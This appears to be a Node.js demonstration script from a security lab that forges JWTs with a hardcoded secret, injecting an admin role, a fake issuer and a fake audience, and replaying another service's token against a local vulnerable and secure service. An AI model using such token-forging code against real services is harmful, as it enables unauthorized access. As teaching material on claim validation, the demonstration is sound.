/**
 * ATTACK 4: Weak Token Validation Exploitation
 * Demonstrates manipulating JWT claims when only signature is verified.
 * Works against VULNERABLE service; blocked by SECURE service.
 */

const http = require("http");
const jwt = require("jsonwebtoken");

const JWT_SECRET = "SUPER_SECRET";

// Forged token with attacker-controlled claims
const manipulatedToken = jwt.sign(
  {
    typ: "service",
    service: "attacker",       // Wrong service identity
    role: "admin",             // Injected claims
    iss: "evil-service",       // Fake issuer
    aud: "everything"          // Fake audience
  },
  JWT_SECRET
);

// Token with completely wrong issuer/audience (bypasses basic sig check)
const wrongContextToken = jwt.sign(
  {
    typ: "service",
    service: "inventory_service"  // Token for different service being reused here
  },
  JWT_SECRET
);

console.log("=== ATTACK 4: WEAK TOKEN VALIDATION EXPLOITATION ===\n");

function testToken(label, token) {
  return new Promise((resolve) => {
    console.log(`[*] Testing: ${label}`);
    console.log(`    Token payload: ${JSON.stringify(jwt.decode(token))}`);

    const options = {
      hostname: "localhost",
      port: 4000,
      path: "/orders",
      method: "GET",
      headers: {
        Authorization: `Bearer ${token}`
      }
    };

    const req = http.request(options, (res) => {
      let data = "";
      res.on("data", (chunk) => (data += chunk));
      res.on("end", () => {
        if (res.statusCode === 200) {
          console.log(`    [!] ACCEPTED - Status: ${res.statusCode}`);
          console.log(`    [RESULT] VULNERABLE: Manipulated claims were accepted`);
        } else {
          console.log(`    [+] BLOCKED - Status: ${res.statusCode}, Response: ${data}`);
          console.log(`    [RESULT] SECURE: Claim manipulation was rejected`);
        }
        console.log();
        resolve();
      });
    });

    req.on("error", (err) => {
      console.log("    [ERROR]", err.message);
      resolve();
    });

    req.end();
  });
}

async function runTests() {
  await testToken("Manipulated identity (service=attacker)", manipulatedToken);
  await testToken("Wrong context token (inventory_service reused)", wrongContextToken);
}

runTests();
